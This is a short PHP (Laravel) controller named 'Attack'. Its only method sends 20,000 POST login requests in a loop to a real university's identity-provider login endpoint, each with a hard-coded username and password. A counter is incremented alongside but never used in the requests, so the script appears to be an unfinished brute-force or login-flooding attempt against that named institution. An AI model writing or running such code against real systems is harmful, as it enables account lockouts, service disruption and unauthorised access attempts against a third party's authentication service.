<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class Attack extends Controller
{
    public function run()
    {
        $last_value = 120180900;
        $data = array();


        for ($i=1;$i<= 20000; $i++) {
            $last_value = $last_value + 1;
            $data[$i] = $last_value;
             Http::post('https://idp.iugaza.edu.ps/idp/Authn/UserPassword', ['j_username' => 120180875, 'j_password' => '15447896542']);

        }
//dump($last_value);
       // dd($request->status());

        // redirect()->route('')->with('data',$data);
        return view('exceptions.result')->with('data',$last_value);
    }
}
